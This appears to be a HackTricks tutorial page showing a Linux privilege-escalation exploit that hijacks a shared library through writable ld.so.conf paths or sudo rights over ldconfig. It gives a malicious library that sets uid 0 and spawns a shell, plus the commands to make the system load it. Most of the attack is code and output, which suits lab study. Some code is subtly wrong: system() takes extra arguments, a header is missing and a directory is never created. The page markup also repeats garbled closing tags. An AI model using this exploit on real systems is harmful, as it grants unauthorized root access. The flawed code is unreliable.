# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## Prepare the environment

In the following section you can find the code of the files we are going to use to prepare the environment

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Create** those files in your machine in the same folder
2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.

```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
	
$ ./sharedvuln 
Welcome to my amazing application!
Hi
```

## Exploit

In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
**Download and compile** the following code inside that path:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```

Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).

Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:

```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:

```c
$ ./sharedvuln 
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
{% endhint %}

### Other misconfigurations - Same vuln

In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.

## Exploit 2

**Suppose you have sudo privileges over `ldconfig`**.\
You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
So, lets create the files and folders needed to load "/tmp":

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
And finally, lets load the path and check where is the binary loading the library from:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**

{% hint style="info" %}
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
